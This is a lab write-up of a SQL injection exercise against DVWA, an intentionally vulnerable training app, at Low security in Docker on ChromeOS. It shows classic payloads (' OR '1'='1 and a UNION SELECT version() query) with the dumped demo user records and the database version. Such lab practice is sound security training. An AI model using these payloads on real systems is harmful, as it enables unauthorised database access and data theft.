# Task 3: SQL Injection on DVWA (Low Security)

## Overview
This project demonstrates a classic SQL Injection (SQLi) attack on the Damn Vulnerable Web Application (DVWA) running in a Low security configuration within a containerized environment on ChromeOS (Linux Crostini).

## What is SQL Injection?
SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It occurs when untrusted user input is directly concatenated into a dynamic SQL query without proper sanitization or parameterization. This enables an attacker to manipulate the query logic, view sensitive data, modify database contents, or execute administrative operations.

---

## Environment & Setup
- **Operating System:** ChromeOS (Linux/Crostini Debian container)
- **Deployment Strategy:** Docker Containerization (`vulnerables/web-dvwa`)
- **Target Application:** DVWA (Security Level: **Low**)
- **Tools Used:** Web Browser (Google Chrome), Docker Engine

### Setup Steps
1. Enabled the Linux (Crostini) development environment on ChromeOS.
2. Installed and initialized Docker Engine inside the Linux environment:
   ```bash
   sudo apt update && sudo apt install -y docker.io
   sudo systemctl start docker


   ---



# SQL Injection Log & Technical Analysis

## Target Context
- **Target URL:** `http://penguin.linux.test/vulnerabilities/sqli/`
- **Security Level:** Low
- **Authentication:** Session Cookie (`security=low; PHPSESSID=...`)

---

## Injection Execution Log

### Attempt 01: Universal Truth Payload
- **Input Payload:** `' OR '1'='1`
- **Target Field:** `User ID`
- **HTTP Method:** `GET`
- **Parameters Sent:** `id=%27+OR+%271%27%3D%271&Submit=Submit`
- **Captured Output:**
  ```text
  ID: ' OR '1'='1 
  First name: admin
  Surname: admin

  ID: ' OR '1'='1 
  First name: Gordon
  Surname: Brown

  ID: ' OR '1'='1 
  First name: Hack
  Surname: Me

  ID: ' OR '1'='1 
  First name: Pablo
  Surname: Picasso

  ID: ' OR '1'='1 
  First name: Bob
  Surname: Smith


 ### Payload 2 Results
ID: 1' UNION SELECT null, version() #
First name: admin
Surname: admin

ID: 1' UNION SELECT null, version() #
First name: 
Surname: 10.1.26-MariaDB-0+deb9u1